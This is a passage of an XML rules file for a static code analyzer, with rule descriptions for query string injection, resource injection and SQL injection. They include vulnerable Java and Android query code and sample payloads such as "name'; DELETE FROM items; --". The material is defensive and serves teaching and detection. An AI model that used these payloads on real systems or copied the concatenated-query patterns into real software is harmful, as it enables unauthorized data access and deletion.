							  The deprecated <code>InvokerServlet</code> class can be used to invoke any class available to the server's virtual machine. By guessing the fully qualified name of a class, an attacker can load not only Servlet classes, but also POJO classes or any other class available to the JVM.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1]  <em>Invocation is EVIL</em> <br></p>
																									   <p>[2] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_query_string_injection_amazon_web_services
		</key>
		<internalKey>Input Validation and Representation/Query String
			Injection/Amazon Web Services
		</internalKey>
		<name>Query String Injection: Amazon Web Services</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							   Constructing a SimpleDB select statement that contains user input can allow an attacker to view unauthorized records.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Query string injection vulnerabilities occur when:<br>1. Data enters a program from an untrusted source.<br><br><br><br>2. The data is used to dynamically construct a SimpleDB query string.<br><br><br><br><b>Example 1:</b> The following code dynamically constructs and executes a SimpleDB <code>select()</code> query that searches for invoices that match a user-specified product category. The user can also specify the column by which the results are sorted. Assume that the application has already properly authenticated and set the value of <code>customerID</code> prior to this code segment.<br><br><pre><br>...<br>String customerID = getAuthenticatedCustomerID(customerName, customerCredentials);<br>...<br>AmazonSimpleDBClient sdbc = new AmazonSimpleDBClient(appAWSCredentials);<br>String query = "select * from invoices where productCategory = '"<br>            + productCategory + "' and customerID = '"<br>            + customerID + "' order by '"<br>            + sortColumn + "' asc";<br>SelectResult sdbResult = sdbc.select(new SelectRequest(query));<br>...<br></pre><br><br>The query that this code intends to execute looks like:<br><br><pre><br>select * from invoices<br>where productCategory = 'Fax Machines'<br>and customerID = '12345678'<br>order by 'price' asc<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>productCategory</code> and <code>price</code> do not contain single-quote characters. If, however, an attacker provides the string "<code>Fax Machines' or productCategory = \"</code>" for <code>productCategory</code>, and the string "<code>\" order by 'price</code>" for <code>sortColumn</code>, then the query becomes the following:<br><br><pre><br>select * from invoices<br>where productCategory = 'Fax Machines' or productCategory = "'<br>and customerID = '12345678'<br>order by '" order by 'price' asc<br></pre><br><br>or, in a more human-readable form,<br><br><pre><br>select * from invoices<br>where productCategory = 'Fax Machines'<br>or productCategory = "' and customerID = '12345678' order by '"<br>order by 'price' asc<br></pre><br><br>These inputs allow an attacker to bypass the required authentication for <code>customerID</code>, and allows the attacker to view invoice records matching <code>'Fax Machines'</code> for all customers.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M1 Weak Server Side Controls</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19]  <em>Secure Use of Cloud Storage</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[22] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_query_string_injection_android_provider
		</key>
		<internalKey>Input Validation and Representation/Query String
			Injection/Android Provider
		</internalKey>
		<name>Query String Injection: Android Provider</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							   Constructing a SQLite query statement that contains user input can allow an attacker to view unauthorized records.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Query string injection vulnerabilities occur when:<br>  1. Data enters a program from an untrusted source.<br><br>  <br><br>  2. The data is used to dynamically construct a SQLite query string.<br><br>  <br><br>  There is an important distinction between injection attacks against a SQL database and injection attacks against a SQLite database. Unlike SQL injection, SQLite string injection allows malicious users to view unauthorized records, but does not allow them to alter the state of the database in any way.<br><br>  <b>Example 1:</b> The following code dynamically constructs and executes a SQLite query that searches for invoices associated with a customer and a user-specified product category. The user can also specify the column by which the results should be sorted. Assume that the program has already properly authenticated and set the value of <code>customerID</code> prior to this code segment.<br><br>  <pre><br>  ...<br>  productCategory = this.getIntent().getExtras().getString("productCategory");<br>  sortColumn = this.getIntent().getExtras().getString("sortColumn");<br>  customerID = getAuthenticatedCustomerID(customerName, customerCredentials);<br>  c = invoicesDB.query(Uri.parse(invoices), columns, "productCategory = '" + productCategory + "' and customerID = '" + customerID + "'", null, null, null, "'" + sortColumn + "'asc", null);<br>  ...<br>  </pre><br><br>  The query that this code intends to execute looks like:<br><br>  <pre><br>  select * from invoices<br>  where productCategory = 'Fax Machines'<br>  and customerID = '12345678'<br>  order by 'price' asc<br>  </pre><br><br>  However, the query is constructed dynamically by concatenating a constant base query string and a user input string <code>productCategory</code>. So the query behaves correctly only if <code>productCategory</code> and <code>sortColumn</code> do not contain single-quote characters. If an attacker provides the string "<code>Fax Machines' or productCategory = \"</code>" for <code>productCategory</code>, and the string "<code>\" order by 'price</code>" for <code>sortColumn</code>, then the query becomes:<br><br>  <pre><br>  select * from invoices<br>  where productCategory = 'Fax Machines' or productCategory = "'<br>  and customerID = '12345678'<br>  order by '" order by 'price' asc<br>  </pre><br><br>  or, in a more readable form,<br><br>  <pre><br>  select * from invoices<br>  where productCategory = 'Fax Machines'<br>  or productCategory = "' and customerID = '12345678' order by '"<br>  order by 'price' asc<br>  </pre><br><br> These inputs allow an attacker to bypass the required authentication for <code>customerID</code> and allows the attacker to view invoice records matching <code>'Fax Machines'</code> for all customers.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5]  <em>Android Developers-Reference: SQLite Database</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[20] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[21] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[22]  <em>SQL as Understood by SQLite</em> <br></p>
																									   <p>[23] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_resource_injection</key>
		<internalKey>Input Validation and Representation/Resource Injection
		</internalKey>
		<name>Resource Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Allowing user input to control resource identifiers could enable an attacker to access or modify otherwise protected system resources.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A resource injection issue occurs when the following two conditions are met:<br><br>1. An attacker can specify the identifier used to access a system resource.<br><br>For example, an attacker may be able to specify a port number to be used to connect to a network resource.<br><br>2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.<br><br>For example, the program may give the attacker the ability to transmit sensitive information to a third-party server.<br><br><br><br>Note: Resource injection that involves resources stored on the filesystem goes by the name path manipulation and is reported in separate category. See the path manipulation description for further details of this vulnerability.<br><br><b>Example 1:</b> The following code uses a port number read from an HTTP request to create a socket.<br><br><pre><br>String remotePort = request.getParameter("remotePort");<br>...<br>ServerSocket srvr = new ServerSocket(remotePort);<br>Socket skt = srvr.accept();<br>...<br></pre><br><br>Some think that in the mobile world, classic web application vulnerabilities, such as resource injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 2:</b> The following code uses a URL read from an Android intent to load the page in <code>WebView</code>.<br><br><pre><br>...<br>	WebView webview = new WebView(this);<br>	setContentView(webview);<br>        String url = this.getIntent().getExtras().getString("url");<br>	webview.loadUrl(url);<br>...<br></pre><br><br>The kind of resource affected by user input indicates the kind of content that may be dangerous. For example, data containing special characters like period, slash, and backslash are risky when used in methods that interact with the file system. Similarly, data that contains URLs and URIs is risky for functions that create remote connections.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A1 Unvalidated Input</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3600 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 99</em> <br></p>
																									   <p>[11] G. Hoglund, G. McGraw <em>Exploiting Software</em> Addison-Wesley<br></p>
																									   <p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M8 Security Decisions Via Untrusted Inputs</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.4</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[17] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[18] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_sql_injection</key>
		<internalKey>Input Validation and Representation/SQL Injection
		</internalKey>
		<name>SQL Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>In this case HP Fortify Static Code Analyzer could not determine that the source of the data is trusted.<br><br>2. The data is used to dynamically construct a SQL query.<br><br><br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.<br><br><pre><br>...<br>	String userName = ctx.getAuthenticatedUserName();<br>	String itemName = request.getParameter("itemName");<br>	String query = "SELECT * FROM items WHERE owner = '"<br>				+ userName + "' AND itemname = '"<br>				+ itemName + "'";<br>	ResultSet rs = stmt.execute(query);<br>...<br></pre><br><br>The query that this code intends to execute follows:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = &lt;userName&gt;<br>	AND itemname = &lt;itemName&gt;;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>	SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'; DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	--'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one used in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>	SELECT * FROM items<br>	WHERE owner = 'wiley'<br>	AND itemname = 'name';<br><br>	DELETE FROM items;<br><br>	SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>Some think that in the mobile world, classic web application vulnerabilities, such as SQL injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 3:</b> The following code adapts Example 1 to the Android platform.<br><br><pre><br>...<br>        PasswordAuthentication pa = authenticator.getPasswordAuthentication();<br>        String userName = pa.getUserName();<br>        String itemName = this.getIntent().getExtras().getString("itemName");<br>        String query = "SELECT * FROM items WHERE owner = '"<br>                                + userName + "' AND itemname = '"<br>                                + itemName + "'";<br>        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);<br>        Cursor c = db.rawQuery(query, null);<br>...<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.<br><br>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 89</em> <br></p>
																									   <p>[11] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 089</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[19] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[21] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>SQL Injection</em> <br></p>
																									   <p>[22] P. Finnigan <em>SQL Injection and Oracle, Part One</em> Security Focus<br></p>
																									   <p>[23] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>
																									   <p>[24] P. Litwin <em>Stop SQL Injection Attacks Before They Stop You</em> MSDN Magazine<br></p>
																									   <p>[25] M. Howard, D. LeBlanc <em>Writing Secure Code, Second Edition</em> Microsoft Press<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_sql_injection_hibernate</key>
		<internalKey>Input Validation and Representation/SQL
			Injection/Hibernate
		</internalKey>
		<name>SQL Injection: Hibernate</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic SQL statement with input coming from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  SQL injection errors occur when:<br><br>1. Data enters a program from an untrusted source.<br><br>In this case HP Fortify Static Code Analyzer could not determine that the source of the data is trusted.<br><br>2. The data is used to dynamically construct a SQL query.<br><br><br><br><b>Example 1:</b> The following code dynamically constructs and executes a SQL query that searches for items matching a specified name. The query restricts the items displayed to those where the owner matches the user name of the currently-authenticated user.<br><br><pre><br>...<br>        String userName = ctx.getAuthenticatedUserName();<br>        String itemName = request.getParameter("itemName");<br>        String query = "SELECT * FROM items WHERE owner = '"<br>                                + userName + "' AND itemname = '"<br>                                + itemName + "'";<br>        ResultSet rs = stmt.execute(query);<br>...<br></pre><br><br>The query that this code intends to execute follows:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = &lt;userName&gt;<br>        AND itemname = &lt;itemName&gt;;<br></pre><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>itemName</code> does not contain a single-quote character. If an attacker with the user name <code>wiley</code> enters the string "<code>name' OR 'a'='a</code>" for <code>itemName</code>, then the query becomes the following:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name' OR 'a'='a';<br></pre><br><br>The addition of the <code>OR 'a'='a'</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><pre><br>        SELECT * FROM items;<br></pre><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all entries stored in the <code>items</code> table, regardless of their specified owner.<br><br><b>Example 2:</b> This example examines the effects of a different malicious value passed to the query constructed and executed in Example 1. If an attacker with the user name <code>wiley</code> enters the string "<code>name'; DELETE FROM items; --</code>" for <code>itemName</code>, then the query becomes the following two queries:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name';<br><br>        DELETE FROM items;<br><br>        --'<br></pre><br><br>Many database servers, including Microsoft(R) SQL Server 2000, allow multiple SQL statements separated by semicolons to be executed at once. While this attack string results in an error on Oracle and other database servers that do not allow the batch-execution of statements separated by semicolons, on databases that do allow batch execution, this type of attack allows the attacker to execute arbitrary commands against the database.<br><br>Notice the trailing pair of hyphens (--), which specifies to most database servers that the remainder of the statement is to be treated as a comment and not executed [4]. In this case the comment character serves to remove the trailing single-quote left over from the modified query. On a database where comments are not allowed to be used in this way, the general attack could still be made effective using a trick similar to the one used in Example 1. If an attacker enters the string "<code>name'); DELETE FROM items; SELECT * FROM items WHERE 'a'='a</code>", the following three valid statements will be created:<br><br><pre><br>        SELECT * FROM items<br>        WHERE owner = 'wiley'<br>        AND itemname = 'name';<br><br>        DELETE FROM items;<br><br>        SELECT * FROM items WHERE 'a'='a';<br></pre><br><br>Some think that in the mobile world, classic web application vulnerabilities, such as SQL injection, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication.<br><br><b>Example 3:</b> The following code adapts Example 1 to the Android platform.<br><br><pre><br>...<br>        PasswordAuthentication pa = authenticator.getPasswordAuthentication();<br>        String userName = pa.getUserName();<br>        String itemName = this.getIntent().getExtras().getString("itemName");<br>        String query = "SELECT * FROM items WHERE owner = '"<br>                                + userName + "' AND itemname = '"<br>                                + itemName + "'";<br>        SQLiteDatabase db = this.openOrCreateDatabase("DB", MODE_PRIVATE, null);<br>        Cursor c = db.rawQuery(query, null);<br>...<br></pre><br><br>One traditional approach to preventing SQL injection attacks is to handle them as an input validation problem and either accept only characters from a whitelist of safe values or identify and escape a blacklist of potentially malicious values. Whitelisting can be a very effective means of enforcing strict input validation rules, but parameterized SQL statements require less maintenance and can offer more guarantees with respect to security. As is almost always the case, blacklisting is riddled with loopholes that make it ineffective at preventing SQL injection attacks. For example, attackers can:<br><br>- Target fields that are not quoted<br><br>- Find ways to bypass the need for certain escaped meta-characters<br><br>- Use stored procedures to hide the injected meta-characters<br><br>Manually escaping characters in input to SQL queries can help, but it will not make your application secure from SQL injection attacks.<br><br>Another solution commonly proposed for dealing with SQL injection attacks is to use stored procedures. Although stored procedures prevent some types of SQL injection attacks, they fail to protect against many others. Stored procedures typically help prevent SQL injection attacks by limiting the types of statements that can be passed to their parameters. However, there are many ways around the limitations and many interesting statements that can still be passed to stored procedures. Again, stored procedures can prevent some exploits, but they will not make your application secure against SQL injection attacks.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II</em> <br></p>
